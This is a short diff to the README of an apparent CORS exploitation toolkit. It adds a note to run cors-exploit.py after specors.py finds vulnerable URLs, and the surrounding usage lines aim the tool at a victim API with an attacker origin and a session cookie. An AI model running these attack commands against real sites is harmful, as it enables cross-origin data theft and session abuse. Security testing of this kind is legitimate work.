@@ -11,6 +11,10 @@ This repository provides in-depth knowledge, exploitation techniques, and PoCs t
 
 # USES
 
+"AFTER FINDING VULNERABLE URLS USING specors.py then use cors-exploit.py"
+
+
+
 ``python cors-exploit.py -t "https://victim.com/api" -a "evil.attacker.com"``
 
 ``python cors-exploit.py -t "https://victim.com/api" -a "evil.attacker.com" -c "your_session_cookie"``
